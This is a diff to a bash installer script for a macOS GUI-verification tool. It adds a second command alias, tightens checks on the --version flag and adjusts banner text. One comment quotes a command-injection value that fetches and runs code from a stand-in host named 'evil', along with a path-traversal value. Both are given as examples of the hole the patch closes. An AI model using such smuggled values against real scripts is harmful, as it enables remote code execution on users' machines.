@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # glasspane-harness one-click installer
 #
-#   curl -fsSL https://raw.githubusercontent.com/jingzhao-l/glasspane-harness/v0.12.3/scripts/install.sh | bash
+#   curl -fsSL https://raw.githubusercontent.com/jingzhao-l/glasspane-harness/v0.12.4/scripts/install.sh | bash
 #   bash scripts/install.sh                 # install (npm first, GitHub release asset as fallback)
 #   bash scripts/install.sh --dry-run       # print the plan, touch nothing
 #   bash scripts/install.sh --version 0.1.0 # pin a version
@@ -19,6 +19,11 @@
 set -euo pipefail
 
 PRODUCT="glasspane-harness"
+# The product's second name for the same command (`product.json` `bins[1]`, which the npm wrapper
+# installs as a symlink). `harness/tools/product-surface.mjs`'s `bins` rule is what keeps this
+# literal and that array the same word; the release-asset channel below needs the name because it
+# unpacks one binary and has to create the alias the other two channels get from the manifest.
+PRODUCT_ALT="gp-harness"
 VERSION=""
 REPO="jingzhao-l/glasspane-harness"
 DRY_RUN=0
@@ -106,6 +111,21 @@ while [ $# -gt 0 ]; do
   shift
 done
 
+# `--version` is data from the command line that goes into a URL, into the asset name, and into the
+# remedy lines this script prints for a human or an agent to paste back into a shell. The API-resolved
+# branch below already screens its answer (`[0-9]*.[0-9]*`), but the flag branch never did, so
+# `--version '1.0$(curl evil|sh)'` reached the printed command and `--version '../../x'` reached the
+# URL. One shape, checked once, before anything reads it: three dot-separated numbers, nothing else.
+if [ -n "$VERSION" ]; then
+  case "$VERSION" in
+    [0-9]*.[0-9]*.[0-9]*) ;;
+    *) error "--version '$VERSION' is not a version this product publishes — the shape is three dot-separated numbers (X.Y.Z)"; exit 1 ;;
+  esac
+  case "$VERSION" in
+    *[!0-9.]*) error "--version '$VERSION' carries characters that are not digits or dots — refusing to put them in a URL or in a command line"; exit 1 ;;
+  esac
+fi
+
 # From here on every URL this script prints for itself is named after the version in hand.
 pin_installer_url "$VERSION"
 
@@ -136,9 +156,9 @@ fi
 # ------------------------------------------------------------------ banner
 echo ""
 echo -e "${BOLD}${CYAN}┌───────────────────────────────────────────────────────────┐${RESET}"
-echo -e "${BOLD}${CYAN}│  GlassPane Harness                                          │${RESET}"
-echo -e "${BOLD}${CYAN}│  evidence-honest GUI verification for macOS apps           │${RESET}"
-echo -e "${BOLD}${CYAN}│  an opencode fork — https://github.com/anomalyco/opencode  │${RESET}"
+echo -e "${BOLD}${CYAN}│  GlassPane Harness                                        │${RESET}"
+echo -e "${BOLD}${CYAN}│  evidence-honest GUI verification for macOS apps          │${RESET}"
+echo -e "${BOLD}${CYAN}│  an opencode fork — https://github.com/anomalyco/opencode │${RESET}"
 echo -e "${BOLD}${CYAN}└───────────────────────────────────────────────────────────┘${RESET}"
 echo ""
 info "GlassPane Harness — evidence-honest GUI verification for macOS apps"
@@ -606,6 +626,22 @@ if [ -z "$INSTALLED_VIA" ]; then
     error "$ASSET did not contain an executable named $PRODUCT — refusing to claim an install"
     exit 1
   fi
+  # `product.json` declares two bins and the npm wrapper installs both (`package.json` maps
+  # `gp-harness` and `glasspane-harness` at the same file). The release asset carries one binary —
+  # `build.ts` writes `dist/<target>/bin/glasspane-harness` and zips that directory — so on this
+  # channel `gp-harness` was documented, promised by `docs/install.md` and by both READMEs, and never
+  # arrived. An alias is what the wrapper gives the user anyway; making the third channel agree is a
+  # fix, not a new capability. The claim is checked, not assumed: the symlink is created, and only a
+  # second executable answering `--version` lets this channel call itself installed.
+  alias_path="$INSTALL_ROOT/bin/$PRODUCT_ALT"
+  if [ ! -e "$alias_path" ]; then
+    ln -s "$PRODUCT" "$alias_path" 2>/dev/null || cp "$INSTALL_ROOT/bin/$PRODUCT" "$alias_path" 2>/dev/null || true
+    chmod +x "$alias_path" 2>/dev/null || true
+  fi
+  if [ ! -x "$alias_path" ]; then
+    error "installed $PRODUCT but $PRODUCT_ALT is not executable — this product advertises both commands, and one is missing"
+    exit 1
+  fi
   # The claim is built from what actually happened, not from what the script intends.
   # This line used to read "sha256 + GPG verified" unconditionally, while four separate
   # states above it (no SHA256SUMS.txt, the asset not listed, no gpg, no .asc) each
@@ -707,7 +743,9 @@ cat <<EOF
    Headless server for clients:    $PRODUCT serve --port 4096
 3. Verify the engine from inside a session: ask the agent for gp_probe_status —
    it reports the engine version, advertised capabilities and permission state.
-   From the shell: $PRODUCT --help
+   From the shell: $PRODUCT --version
+   (the second name for the same command, $PRODUCT_ALT --version, must answer too —
+   this channel created it, so this is where the claim gets checked)
 EOF
 echo ""
 success "done. Docs: https://github.com/$REPO#readme"
